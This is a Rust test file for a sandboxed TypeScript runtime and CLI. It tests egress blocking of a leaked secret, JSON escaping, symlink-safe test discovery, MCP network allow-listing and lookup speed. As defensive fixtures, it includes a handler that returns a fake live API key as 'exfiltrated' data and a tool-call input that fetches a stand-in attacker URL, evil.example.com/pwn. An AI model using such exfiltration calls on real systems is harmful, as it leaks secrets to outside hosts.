use crate::commands::test_runner::discover_test_files;
use crate::commands::unique_temp_cas_path;
use crate::config::{build_cas_archive, collect_watch_fingerprint, parse_u64_digits};
use crate::diagnostics::{handle_mcp_jsonrpc_line, MAX_MCP_LINE_BYTES};
use crate::server::connection::{escape_json_string_into, push_u64_ascii};
use crate::server::{
    resolve_tenant_bytecode_hotswap, serve_connection_keep_alive_with_tls_and_secrets,
};
use slice_engine::{compile_source_to_bytecode, SliceIsolate};
use slice_sandbox::CapabilityToken;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::time::Instant;

#[test]
fn test_cli_sec_01_server_audit_secrets_and_json_escaped_violation_response() {
    // 1. Verify `serve_connection_keep_alive_with_tls_and_secrets` enforces explicit `audit_secrets`
    // (`--audit-egress` / `slice.toml` `audit_egress`) even when the secret is not in `allowed_env_keys`.
    let handler_ts = r#"
export default {
    fetch(req: Request): Response {
        const url = new URL(req.url);
        if (url.pathname === "/leak") {
            return new Response("exfiltrated=sk_live_explicit_audit_secret_778899");
        }
        // Trigger a SandboxViolation containing quotes and backslashes in the key
        const s = env("SECRET_\"QUOTE\"_\\BACKSLASH");
        return new Response(s);
    }
};
"#;
    let bc = std::sync::Arc::new(compile_source_to_bytecode(handler_ts));
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    let bc_srv = std::sync::Arc::clone(&bc);

    let srv_handle = std::thread::spawn(move || {
        let mut read_buf = vec![0u8; 65536];
        let mut write_buf = Vec::with_capacity(4096);
        let secrets = vec!["sk_live_explicit_audit_secret_778899".to_string()];
        if let Ok((stream, _)) = listener.accept() {
            let _ = serve_connection_keep_alive_with_tls_and_secrets(
                stream,
                1,
                &bc_srv,
                None,
                None,
                None,
                &CapabilityToken::pure_compute(),
                &secrets,
                2_000_000,
                4 * 1024 * 1024,
                &mut read_buf,
                &mut write_buf,
                None,
                None,
            );
        }
    });

    let mut client = TcpStream::connect(addr).unwrap();
    client
        .write_all(
            concat!(
                "GET /leak HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n",
                "GET /quote HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
            )
            .as_bytes(),
        )
        .unwrap();
    client.flush().unwrap();

    let mut resp = String::new();
    client.read_to_string(&mut resp).unwrap();
    srv_handle.join().unwrap();

    assert!(
        resp.contains("HTTP/1.1 403 Forbidden") && resp.contains("EGRESS_SECRET_LEAK_BLOCKED"),
        "Expected explicit audit_secrets to block egress leak on HTTP server: {}",
        resp
    );

    // Verify every JSON body in the 403 responses parses as valid RFC 8259 JSON
    for part in resp.split("HTTP/1.1 403 Forbidden").skip(1) {
        if let Some((_, body)) = part.split_once("\r\n\r\n") {
            let trimmed = body.trim();
            let parsed: serde_json::Value = serde_json::from_str(trimmed)
                .unwrap_or_else(|e| panic!("Invalid JSON '{}': {}", trimmed, e));
            assert!(parsed["error"].is_string());
        }
    }

    let mut escaped = String::new();
    escape_json_string_into("bad\"quote\\slash\nline", &mut escaped);
    assert_eq!(escaped, r#"bad\"quote\\slash\nline"#);
}

#[test]
fn test_cli_sec_02_unique_temp_cas_staging_paths_never_collide() {
    let p1 = unique_temp_cas_path("slice_compile_staging").unwrap();
    let p2 = unique_temp_cas_path("slice_compile_staging").unwrap();
    assert_ne!(
        p1, p2,
        "Concurrent staging CAS paths must be unique per invocation"
    );
    assert!(p1
        .file_name()
        .unwrap()
        .to_string_lossy()
        .starts_with("slice_compile_staging_"));
}

#[test]
fn test_cli_sec_03_watch_fingerprint_and_test_discovery_skip_symlinks() {
    let tmp_dir = std::env::temp_dir().join("slice_cli_sec03_watch_and_tests");
    let _ = std::fs::remove_dir_all(&tmp_dir);
    std::fs::create_dir_all(tmp_dir.join("src")).unwrap();
    std::fs::create_dir_all(tmp_dir.join("node_modules/pkg")).unwrap();

    std::fs::write(tmp_dir.join("src/index.ts"), "export const x = 1;\n").unwrap();
    std::fs::write(
        tmp_dir.join("src/math.test.ts"),
        "export const ok = true;\n",
    )
    .unwrap();
    std::fs::write(
        tmp_dir.join("node_modules/pkg/ignored.test.ts"),
        "export const ignored = true;\n",
    )
    .unwrap();

    let fp1 = collect_watch_fingerprint(&tmp_dir);
    let fp2 = collect_watch_fingerprint(&tmp_dir);
    assert_eq!(fp1, fp2);
    assert_ne!(fp1, 0);

    let tests = discover_test_files(&tmp_dir).unwrap();
    assert_eq!(tests.len(), 1);
    assert!(tests[0].ends_with("math.test.ts"));

    let _ = std::fs::remove_dir_all(&tmp_dir);
}

#[test]
fn test_cli_sec_04_mcp_allow_net_wiring_and_line_size_cap() {
    let caps = CapabilityToken::pure_compute().with_net_host("api.trusted.internal:443");
    let mut isolate = SliceIsolate::spawn("mcp-sec04", 1, caps, 500_000, 1024 * 1024);

    // 1. Verify `allowNet` in `slice_eval_ts` narrows network capability to only the specified host
    let req_denied = r#"{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"slice_eval_ts","arguments":{"code":"const r = fetch(\"https://evil.example.com/pwn\");","allowNet":"api.trusted.internal:443"}}}"#;
    let resp = handle_mcp_jsonrpc_line(req_denied, &mut isolate).unwrap();
    assert!(resp.contains(r#""isError":true"#), "resp={}", resp);
    assert!(
        resp.contains("lacks outbound network authority"),
        "resp={}",
        resp
    );

    // 2. Verify oversized MCP JSON-RPC line (> MAX_MCP_LINE_BYTES) is rejected cleanly with -32600
    let oversized = "x".repeat(MAX_MCP_LINE_BYTES + 64);
    let over_resp = handle_mcp_jsonrpc_line(&oversized, &mut isolate).unwrap();
    assert!(over_resp.contains("-32600"));
    assert!(over_resp.contains("exceeds 4 MB limit"));
}

#[test]
fn test_cli_perf_01_02_tenant_hotswap_and_itoa_header_microbench() {
    assert_eq!(parse_u64_digits("50_000_000"), Some(50_000_000));
    assert_eq!(parse_u64_digits("16384 KB"), Some(16384));
    assert_eq!(parse_u64_digits("no-digits"), None);

    let mut buf = Vec::with_capacity(64);
    push_u64_ascii(&mut buf, 1234567890);
    assert_eq!(&buf, b"1234567890");

    let tmp_dir = std::env::temp_dir().join("slice_cli_perf_tenant_hotswap");
    let _ = std::fs::remove_dir_all(&tmp_dir);
    std::fs::create_dir_all(&tmp_dir).unwrap();
    let src_path = tmp_dir.join("t1.ts");
    let cas_path = tmp_dir.join("tenant-fast-1.cas");
    std::fs::write(&src_path, "Slice.respond(200, \"ok\", \"text/plain\");\n").unwrap();
    build_cas_archive(&src_path, &cas_path, "./t1.ts").unwrap();

    // Warm up cache entry
    let initial = resolve_tenant_bytecode_hotswap(&tmp_dir, "tenant-fast-1").unwrap();
    assert!(!initial.is_empty());

    let iters = 1_000usize;
    let t0 = Instant::now();
    for _ in 0..iters {
        let bc = resolve_tenant_bytecode_hotswap(&tmp_dir, "tenant-fast-1").unwrap();
        std::hint::black_box(bc.len());
    }
    let avg_us = t0.elapsed().as_nanos() as f64 / (iters as f64 * 1_000.0);
    println!(
        "[slice-cli perf] 1,000 cached resolve_tenant_bytecode_hotswap lookups avg: {:.2} us/lookup",
        avg_us
    );

    let _ = std::fs::remove_dir_all(&tmp_dir);
}
